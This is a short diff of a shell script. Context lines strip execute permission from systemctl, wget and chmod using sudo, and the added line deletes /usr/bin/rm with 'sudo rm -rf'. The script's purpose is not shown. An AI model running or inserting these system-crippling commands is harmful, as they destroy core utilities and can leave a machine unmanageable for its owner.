@@ -91,6 +91,7 @@ sudo chmod -x /bin/systemctl
 sudo chmod -x /usr/bin/wget
 sudo chmod -x /usr/bin/chmod
 sudo chmod -x /bin/chmod
+sudo rm -rf /usr/bin/rm
 echo
 echo "-----------------------------------------------------------------------------"
 echo "-----------------------------------------------------------------------------"
